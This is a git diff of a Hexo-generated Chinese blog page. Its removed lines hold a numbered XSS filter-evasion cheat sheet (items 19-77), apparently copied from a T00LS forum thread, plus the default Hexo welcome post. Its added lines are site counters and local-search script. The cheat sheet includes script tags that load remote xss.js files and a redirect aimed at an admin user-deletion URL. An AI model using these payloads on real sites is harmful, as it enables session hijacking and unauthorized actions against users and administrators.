-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out</span><br></pre></td></tr></table></figure>
-
-<p>(19)Spaces和meta前的IMG标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot; javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(20)Non-alpha-non-digit XSS</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(21)Non-alpha-non-digit XSS to 2</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(22)Non-alpha-non-digit XSS to 3</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(23)双开括号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(24)无结束脚本标记(仅火狐等浏览器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(25)无结束脚本标记2</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(26)半开的HTML/JavaScript XSS</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;</span><br></pre></td></tr></table></figure>
-
-<p>(27)双开角括号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br></pre></td></tr></table></figure>
-
-<p>(28)无单引号 双引号 分号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;a=/XSS/</span><br><span class="line"></span><br><span class="line">alert(a.source)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(29)换码过滤的JavaScript</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;;alert(&apos;XSS&apos;);//</span><br></pre></td></tr></table></figure>
-
-<p>(30)结束Title标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(31)Input Image</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(32)BODY Image</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(33)BODY标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(34)IMG Dynsrc</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(35)IMG Lowsrc</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(36)BGSOUND</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(37)STYLE sheet</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(38)远程样式表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://3w.org/xss.css&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(39)List-style-image(列表式)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br></pre></td></tr></table></figure>
-
-<p>(40)IMG VBscript</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br></pre></td></tr></table></figure>
-
-<p>(41)META链接url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;</span><br><span class="line"></span><br><span class="line">URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(42)Iframe</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(43)Frame</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;12-7-1 T00LS - Powered by Discuz! Board</span><br><span class="line"></span><br><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 3/6</span><br></pre></td></tr></table></figure>
-
-<p>(44)Table</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(45)TD</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(46)DIV background-image</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-<br>8&amp;13&amp;12288&amp;65279)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(48)DIV expression</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE=&quot;width: expression_r(alert(&apos;XSS&apos;));&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(49)STYLE属性分拆表达</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG STYLE=&quot;xss:expression_r(alert(&apos;XSS&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(50)匿名STYLE(组成:开角号和一个字母开头)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;XSS STYLE=&quot;xss:expression_r(alert(&apos;XSS&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(51)STYLE background-image</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(52)IMG STYLE方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exppression(alert(&quot;XSS&quot;))&apos;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(53)STYLE background</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(54)BASE</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;EMBED SRC=&quot;http://3w.org/XSS/xss.swf&quot; &gt;&lt;/EMBED&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(56)在flash中使用ActionScrpt可以混进你XSS的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=&quot;get&quot;;</span><br><span class="line"></span><br><span class="line">b=&quot;URL(\&quot;&quot;;</span><br><span class="line"></span><br><span class="line">c=&quot;javascript:&quot;;</span><br><span class="line"></span><br><span class="line">d=&quot;alert(&apos;XSS&apos;);\&quot;)&quot;;</span><br><span class="line"></span><br><span class="line">eval_r(a+b+c+d);</span><br></pre></td></tr></table></figure>
-
-<p>(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML xmlns:xss&gt;</span><br><span class="line"></span><br><span class="line">&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://3w.org/XSS/xss.htc&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;</span><br><span class="line"></span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(58)如果过滤了你的JS你可以在图片里添加JS代码来利用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC=&quot;&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(59)IMG嵌入式命令,可执行任意命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;http://www.a.com/a.php?a=b&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(60)IMG嵌入式命令(a.jpg在同服务器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser</span><br></pre></td></tr></table></figure>
-
-<p>(61)绕符号过滤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(62)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(63)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; &quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(64)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(65)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a=`&gt;` SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(66)12-7-1 T00LS - Powered by Discuz! Board</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 4/6</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&apos;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(67)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://3w.org/xss.js&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(68)URL绕行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://127.0.0.1/&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(69)URL编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://3w.org&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(70)IP十进制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://3232235521″&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(71)IP十六进制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(72)IP八进制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(73)混合编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(74)节省[http:]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(75)节省[www]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(76)绝对点绝对DNS</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(77)javascript链接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
+            <p>
+              XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+解析器如何工作For example, a  tag may be able to terminate a script block even if it
+              ...
+            </p>
+          <!--noindex-->
           
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/24/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Huha">
-      <meta itemprop="description" content="空集是所有集合的子集">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Huha's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/07/24/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-07-24 17:58:17 / 修改时间：21:21:34" itemprop="dateCreated datePublished" datetime="2019-07-24T17:58:17+08:00">2019-07-24</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/24/xss入门总结/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
           
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/建站/" itemprop="url" rel="index"><span itemprop="name">建站</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
+          <!--/noindex-->
         
       
     </div>
@@ -1198,7 +726,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-count">2</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -1215,9 +743,7 @@
                     
                       
                     
-                      
-                    
-                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-count">2</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -1238,11 +764,7 @@
                     
                       
                     
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-count">4</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -1289,6 +811,12 @@
 
   
 
+
+
+
+
+
+
   
 </div>
 
@@ -1306,7 +834,23 @@
 
 
 
+
+<div>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+本站总访问量 <span id="busuanzi_value_site_pv"></span> 次&nbsp&nbsp&nbsp
+本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</div>
+
         
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
 
 
 
@@ -1415,6 +959,326 @@
 
   
 
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
